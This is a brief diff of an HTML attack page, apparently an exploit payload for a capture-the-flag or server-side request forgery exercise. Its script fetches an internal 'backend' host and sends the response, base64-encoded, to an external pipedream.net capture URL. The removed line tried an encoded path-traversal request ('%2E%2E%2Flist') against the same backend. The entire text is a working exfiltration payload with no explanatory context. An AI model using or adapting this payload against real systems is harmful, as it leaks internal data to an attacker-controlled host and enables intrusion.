@@ -4,6 +4,6 @@
         window.location = 'https://en5crqspl81fs.x.pipedream.net/?x='+btoa(data)
     }
 
-    fetch('http://backend/view/%2E%2E%2Flist').then(x=>x.text()).then(submitData).catch(e=>submitData(`${e}`))
+    fetch('http://backend').then(x=>x.text()).then(submitData).catch(e=>submitData(`${e}`))
   </script>
 </html>
